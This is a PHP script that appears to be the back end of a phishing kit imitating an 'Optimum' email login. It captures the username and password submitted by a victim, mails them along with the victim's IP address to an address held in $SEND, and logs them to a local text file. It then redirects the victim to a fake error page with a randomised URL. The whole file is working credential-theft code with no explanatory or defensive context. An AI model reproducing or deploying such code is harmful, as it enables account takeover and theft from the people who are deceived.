<?php
session_start();
$_SESSION['id1'] = $_POST['id1'];
$_SESSION['pass'] = $_POST['pass'];


include 'Email.php';

$ip = getenv("REMOTE_ADDR");

$message .= "--------------[ E M A I L ]---------------------\n";
$message .= "USER     : ".$_SESSION['id1']."\n";
$message .= "PASS     : ".$_SESSION['pass']."\n";
$message .= "--------------[ I P ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ C O N A N ]---------------------\n";
$subject = "Email OPTimum  $ip";
$headers = "From: BLESSING <webmaster@server.com>";
mail($SEND,$subject,$message,$headers);

$file = fopen("mco.txt", 'a');

fwrite($file, $message);

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

$Logon="error.html?$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");

?>